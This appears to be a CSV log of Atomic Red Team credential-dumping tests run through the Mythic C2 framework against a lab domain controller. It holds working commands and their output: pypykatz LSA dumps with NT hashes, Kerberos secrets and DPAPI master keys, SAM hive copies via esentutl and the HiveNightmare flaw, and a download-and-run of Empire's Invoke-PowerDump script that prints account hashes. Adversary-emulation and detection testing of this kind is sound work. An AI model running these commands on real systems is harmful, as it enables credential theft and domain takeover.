command,timestamp,status,api,name,GUID,description,platform,executor,timeout,callback_id,output
"""C:\temp\ART\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz"" live lsa 
",2024-09-05T19:03:06.64851,success,mythic,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.
",['windows'],shell,300,16,"FILE: ======== live =======
== LogonSession ==
authentication_id 260306 (3f8d2)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:42.435817+00:00
sid S-1-5-18
luid 260306
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 94715 (171fb)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2024-09-05T18:48:03.138609+00:00
sid S-1-5-90-0-1
luid 94715
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [171fb]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [171fb]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 38252 (956c)
session_id 0
username 
domainname 
logon_server 
logon_time 2024-09-05T18:47:46.355978+00:00
sid None
luid 38252
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 390484 (5f554)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2024-09-05T18:49:09.655231+00:00
sid S-1-5-90-0-2
luid 390484
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f554]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [5f554]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 389181 (5f03d)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2024-09-05T18:49:09.561472+00:00
sid S-1-5-96-0-2
luid 389181
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f03d]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [5f03d]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 241114 (3adda)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:36.170198+00:00
sid S-1-5-18
luid 241114
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 239396 (3a724)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:35.123464+00:00
sid S-1-5-18
luid 239396
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:47:45.902836+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: gorilla-dc01-20$
		Domain: LUDUS.DOMAIN
	== WDIGEST [3e7]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 80ada36d-340f-446b-b707-fb94fe58fe94
		masterkey f8243b3ed9871f793dcded5c30f7244ce0a9c8c1400e25c9fbab3516cc2d8d8ff9a06e70748b4e6ce73258b6bd46b6ca6dc2e78c99b2e409acb35b143e619520
		sha1_masterkey 80e820a9ea54de37154e341e596db256886e1f8e
	== DPAPI [3e7]==
		luid 999
		key_guid 200fb97f-8833-44f6-b1ff-3366c4ad9408
		masterkey 4331c411e453847de26fbb5ba555ef7db21fcaef57cb3ee7404a2ddb7813a908360f34fe2d3d599799d044526b7541888f739dbb38e57583dfec6e80f80e5e1b
		sha1_masterkey 2686d7ac32487112e25b2f8548c84e894d659e2b
	== DPAPI [3e7]==
		luid 999
		key_guid fa16f472-a49b-480d-8bed-9d161ccc921b
		masterkey c45499f16b5e1f0968a9bc4ef3d7689251bbfda3d10db63069da7fc35132e3b07ab061d27138f3f7e04c82b1dc8aa80e603b0a0f2edff3d8ba9ada3fffae37db
		sha1_masterkey f35169f1928497620a3c5be347c39648f6860a68
	== DPAPI [3e7]==
		luid 999
		key_guid ffd6a5df-1ca5-4246-962f-459e72f811af
		masterkey e2bb5a8fbe261d3a00e31e83b62dfc88bb486b941ef5dce42f413fcea46d5e61640ac39eced2fab840fcd5b817c9743b91c6aaf91e7ae982f808a27631c727ef
		sha1_masterkey 7621315e1bff01c185174a93c699149ea9136ffd

== LogonSession ==
authentication_id 262630 (401e6)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:42.998330+00:00
sid S-1-5-18
luid 262630
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:47:53.480835+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3e4]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: gorilla-dc01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [3e4]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 41123 (a0a3)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2024-09-05T18:47:53.215221+00:00
sid S-1-5-96-0-0
luid 41123
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [a0a3]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [a0a3]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 1073826 (1062a2)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:53:39.882256+00:00
sid S-1-5-18
luid 1073826
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 529612 (814cc)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:49:35.078692+00:00
sid S-1-5-18
luid 529612
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 377951 (5c45f)
session_id 0
username domainadmin
domainname ludus
logon_server GORILLA-DC01-20
logon_time 2024-09-05T18:49:08.420850+00:00
sid S-1-5-21-903249192-3388767019-2944072788-1105
luid 377951

== LogonSession ==
authentication_id 258253 (3f0cd)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:40.420290+00:00
sid S-1-5-18
luid 258253
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 254659 (3e2c3)
session_id 1
username domainadmin
domainname ludus
logon_server GORILLA-DC01-20
logon_time 2024-09-05T18:48:39.467084+00:00
sid S-1-5-21-903249192-3388767019-2944072788-1105
luid 254659
	== MSV ==
		Username: domainadmin
		Domain: ludus
		LM: NA
		NT: 8846f7eaee8fb117ad06bdd830b7586c
		SHA1: e8f97fba9104d1ea5047948e6dfb67facd9f5b73
		DPAPI: 7a6482ef8c8b24de122275ae0b411e4f00000000
	== WDIGEST [3e2c3]==
		username domainadmin
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: domainadmin
		Domain: LUDUS.DOMAIN
	== WDIGEST [3e2c3]==
		username domainadmin
		domainname ludus
		password None
		password (hex)
	== DPAPI [3e2c3]==
		luid 254659
		key_guid 6ebfbdec-28af-4a4c-adab-34f1d084942a
		masterkey 1f3eaf7330bbedb9b9c6b3776a87c68699238c2281fcba9542308bc9871656fd5cfcb11835bb0d51c282732a26e00eba442c6e5329e5b4f2c070def9f08ae92e
		sha1_masterkey 70c25e3019b4aee53e3fd2db538496e46783ed5b
	== DPAPI [3e2c3]==
		luid 254659
		key_guid 466120bb-a0bb-4cda-9c90-162a612b2817
		masterkey 9aa5baeb4674133628165032c788904121a6a6e6b86953f4aba99336276047739715577dfddfe44759eea8b2ec4833bc940ca391b8243343ae9f45433a7240ba
		sha1_masterkey 46cf47cb24cfa143677b8505ab6bf0afd4f96c1f

== LogonSession ==
authentication_id 233115 (38e9b)
session_id 0
username GORILLA-DC01-20$
domainname ludus
logon_server 
logon_time 2024-09-05T18:48:33.326468+00:00
sid S-1-5-18
luid 233115
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: LUDUS.DOMAIN

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2024-09-05T18:47:56.840204+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 60173 (eb0d)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2024-09-05T18:47:55.762089+00:00
sid S-1-5-90-0-1
luid 60173
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [eb0d]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [eb0d]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

== LogonSession ==
authentication_id 41076 (a074)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2024-09-05T18:47:53.215221+00:00
sid S-1-5-96-0-1
luid 41076
	== MSV ==
		Username: GORILLA-DC01-20$
		Domain: ludus
		LM: NA
		NT: 1624ddc30c1e3f54002f0ad3b777e2d3
		SHA1: 4337ced88a8915c71168cfebd26770e36eb4dcaa
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [a074]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)
	== Kerberos ==
		Username: GORILLA-DC01-20$
		Domain: ludus.domain
		Password: 0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
		password (hex)0c720d5685fa7d980148e0f1b799f9dd0f01b0b3861f91229bd76674a7b4a77403bd58441e20ff89055397f9ded1459df3d17b06d8d3ecbbd828fc1c73ecb0beb95f31dd8d4b58e470352387e85be7cfcf0d843834559ce6c75cd1ece833966cd67d91a8a5332657409723ebd7bfb967cc766dc83f6344d7f637f2569e17d6baa53f378c834e0af67a6cd209baaf13f0c7ad52f04c22e8c159b5f83999188ebef9fea2ab0f60b6684040c619dd1c29d2fe91c32686f5a6a64b5e1d62093ebc6540a03f182727e742c80524466bfac311a5318239b7e5ae94b5d001205f7953e71ce60aa51c3fe73b362e1322e5944c00
	== WDIGEST [a074]==
		username GORILLA-DC01-20$
		domainname ludus
		password None
		password (hex)

"
"esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
",2024-09-05T19:03:34.093961,success,mythic,esentutl.exe SAM copy,a90c2f4d-6726-444e-99d2-a00cd7c20480,"Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
",['windows'],shell,300,16,"
Extensible Storage Engine Utilities for Microsoft(R) Windows(R)
Version 10.0
Copyright (C) Microsoft Corporation. All Rights Reserved.

Initializing VSS subsystem...

Initiating COPY FILE mode...
     Source File: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32
Destination File: C:\Users\DOMAIN~1\AppData\Local\Temp\1/SAM

                      Copy Progress (% complete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

	Total bytes read                = 0x10000 (65536) (0 MB)
	Total bytes written             = 0x10000 (65536) (0 MB)


Operation completed successfully in 19.578 seconds.

"
"del %temp%\SAM >nul 2>&1
",2024-09-05T19:03:44.507408,success,mythic,esentutl.exe SAM copy,a90c2f4d-6726-444e-99d2-a00cd7c20480,"Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
",['windows'],shell,300,16,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\PowerDump.ps1"") {echo ""Test Passed""} else {echo 'Test Failed'} ",2024-09-05T19:03:54.645804,success,mythic,PowerDump Hashes and Usernames from Registry,804f28fc-68fc-40da-b5a2-e9d0bce5c193,Executes a hashdump by reading the hashes from the registry.,['windows'],powershell,300,16,"Test Failed
"
"New-Item -Type Directory ""C:\temp\ART\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""C:\temp\ART\..\ExternalPayloads\PowerDump.ps1""",2024-09-05T19:04:05.391413,success,mythic,PowerDump Hashes and Usernames from Registry,804f28fc-68fc-40da-b5a2-e9d0bce5c193,Executes a hashdump by reading the hashes from the registry.,['windows'],powershell,300,16,
"if (Test-Path ""C:\temp\ART\..\ExternalPayloads\PowerDump.ps1"") {echo ""Test Passed""} else {echo 'Test Failed'} ",2024-09-05T19:04:14.07835,success,mythic,PowerDump Hashes and Usernames from Registry,804f28fc-68fc-40da-b5a2-e9d0bce5c193,Executes a hashdump by reading the hashes from the registry.,['windows'],powershell,300,16,"Test Passed
"
"Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green
Import-Module ""C:\temp\ART\..\ExternalPayloads\PowerDump.ps1""
Invoke-PowerDump",2024-09-05T19:04:23.841385,success,mythic,PowerDump Hashes and Usernames from Registry,804f28fc-68fc-40da-b5a2-e9d0bce5c193,Executes a hashdump by reading the hashes from the registry.,['windows'],powershell,300,16,"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


"
"for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
",2024-09-05T19:04:32.793483,success,mythic,dump volume shadow copy hives with certutil,eeb9751a-d598-42d3-b11c-c122d9c3f6c7,"Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as ""HiveNightmare"" or ""SeriousSAM"".
This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",['windows'],shell,300,16,"File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
File Not Found
"
"for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
",2024-09-05T19:04:44.265167,success,mythic,dump volume shadow copy hives with certutil,eeb9751a-d598-42d3-b11c-c122d9c3f6c7,"Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as ""HiveNightmare"" or ""SeriousSAM"".
This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",['windows'],shell,300,16,
"1..10 | % { 
 try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"" , ""$env:TEMP\SAMvss$_"", ""true"") } catch {}
 ls ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore
}
",2024-09-05T19:04:54.761644,success,mythic,dump volume shadow copy hives with System.IO.File,9d77fed7-05f8-476e-a81b-8ff0472c64d0,"Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",['windows'],powershell,300,16,
"1..10 | % {
  rm ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore
}
",2024-09-05T19:05:05.298409,success,mythic,dump volume shadow copy hives with System.IO.File,9d77fed7-05f8-476e-a81b-8ff0472c64d0,"Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",['windows'],powershell,300,16,
